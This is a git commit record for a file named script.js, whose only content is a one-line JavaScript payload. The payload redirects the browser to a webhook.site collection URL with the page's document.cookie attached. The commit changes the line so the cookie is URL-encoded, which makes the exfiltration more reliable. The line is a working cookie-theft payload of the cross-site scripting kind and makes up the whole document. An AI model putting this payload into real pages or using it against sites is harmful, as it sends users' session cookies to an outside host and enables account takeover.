26e5ba361423a788afebbe62f4911c117fcac6c8
Rodrigo Alves <93993233+El-Psy-Kongrooo@users.noreply.github.com>
2024-12-04 15:13:24 +0000

    Update script.js

--- script.js
+++ script.js
@@ -1,1 +1,1 @@
-window.location="https://webhook.site/d17989b9-1585-4eeb-9e98-f5e1d827a675/?cookie="+document.cookie;
+window.location="https://webhook.site/d17989b9-1585-4eeb-9e98-f5e1d827a675/?cookie="+encodeURIComponent(document.cookie);
